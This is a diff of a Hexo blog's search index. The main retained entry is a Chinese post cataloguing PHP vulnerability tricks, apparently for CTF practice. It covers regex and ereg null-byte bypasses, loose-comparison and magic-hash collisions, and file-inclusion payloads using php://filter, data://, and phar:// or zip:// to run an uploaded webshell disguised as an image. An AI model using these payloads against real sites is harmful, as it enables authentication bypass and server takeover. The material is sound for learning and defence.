@@ -1,11 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title></title>
-    <url>%2F2018%2F07%2F17%2FInjection%2F</url>
-    <content type="text"><![CDATA[Injection1.HTML Injection - Reflected (GET)low]]></content>
-  </entry>
-  <entry>
     <title><![CDATA[PHP函数漏洞集]]></title>
     <url>%2F2018%2F06%2F08%2FPHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E9%9B%86%2F</url>
     <content type="text"><![CDATA[正则表达式preg_match如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题123456$ip = &apos;1.1.1.1 abcd&apos;; // 可以绕过if(!preg_match(&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;,$ip)) &#123; die(&apos;error&apos;);&#125; else &#123; // echo(&apos;key...&apos;)&#125; ereg %00 截断ereg 读到 %00 的时候，就截止了12345&lt;?php if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&apos;a&apos;]) === FALSE) &#123; echo &apos;You password must be alphabet&apos;; &#125;?&gt; a=abcd%001234，可以绕过ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE字符串对比解析在这里如果 $_GET[‘password’]为数组，则返回值为NULL如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true其余为false 字符串比较12345678910111213141516171819202122232425&lt;?php echo 0 == &apos;a&apos; ;// a 转换为数字为 0 重点注意 // 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc // 十六进制与整数，被转换为同一进制比较 &apos;0xccccccccc&apos; == &apos;54975581388&apos; ; // 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0 1 == &apos;1&apos;; 1 == &apos;01&apos;; 10 == &apos;1e1&apos;; &apos;100&apos; == &apos;1e2&apos; ; // 十六进制数与带空格十六进制数，被转换为十六进制整数 &apos;0xABCdef&apos; == &apos; 0xABCdef&apos;; echo &apos;0010e2&apos; == &apos;1e3&apos;; // 0e 开头会被当成数字，又是等于 0*10^xxx=0 // 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过 &apos;0e509367213418206700842008763514&apos; == &apos;0e481036490867661113260034900752&apos;; &apos;0e481036490867661113260034900752&apos; == &apos;0&apos; ; var_dump(md5(&apos;240610708&apos;) == md5(&apos;QNKCDZO&apos;)); var_dump(md5(&apos;aabg7XSs&apos;) == md5(&apos;aabC9RqS&apos;)); var_dump(sha1(&apos;aaroZmOk&apos;) == sha1(&apos;aaK1STfY&apos;)); var_dump(sha1(&apos;aaO8zKZF&apos;) == sha1(&apos;aa3OFF9m&apos;));?&gt; 文件包含123http://127.0.0.1/index.php?page=upload这种 url 很容易就能想到可能是文件包含或者伪协议读取http://127.0.0.1/index.php?page=php://filter/read=convert.base64-encode/resource=upload 伪协议php://filter读取文件12index.php?file=php://filter/convert.base64-encode/resource=flag.phpindex.php?file=php://filter/read=convert.base64-encode/resource=flag.php php://input写入文件， 数据利用 POST 传过去1index.php?file=php://input data://将 include 的文件流重定向到用户控制的输入流test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==可以用于控制 file_get_contents 的内容为用户输入的流123$file=$_GET[&apos;file&apos;];$data = @file_get_contents($a,&apos;r&apos;);echo $data; phar://发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含这里的路径为上传的 jpg 文件在服务器的路径/index.php?id=phar://路径/xxx.jpg/shell zip://上述 phar:// 的方法也可以使用 zip://然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。1.zip文件内仅有1.php这个文件123/php?file=zip://1.png%231.php // 也可以尝试不改名为png，直接使用zip上传测试一下/php?file=zip://1.zip%231.php MD5 compare漏洞PHP在处理哈希字符串时，如果利用”!=”或”==”来对哈希值进行比较，它把每一个以”0x”开头的哈希值都解释为科学计数法0的多少次方（为0），所以如果两个不同的密码经过哈希以后，其哈希值都是以”0e”开头的，那么php将会认为他们相同。常见的payload有1234567891011120x01 md5(str) QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a0x02 sha1(str) sha1(&apos;aaroZmOk&apos;) sha1(&apos;aaK1STfY&apos;) sha1(&apos;aaO8zKZF&apos;) sha1(&apos;aa3OFF9m&apos;) 同时MD5不能处理数组，若有以下判断则可用数组绕过12345if(@md5($_GET[&apos;a&apos;]) == @md5($_GET[&apos;b&apos;]))&#123; echo &quot;yes&quot;;&#125;//http://127.0.0.1/1.php?a[]=1&amp;b[]=2 变量覆盖]]></content>
@@ -191,10 +186,5 @@
       <tags>
         <tag>Github+next</tag>
       </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Hello World]]></title>
-    <url>%2F2018%2F03%2F28%2Fhello-world%2F</url>
-    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
   </entry>
 </search>
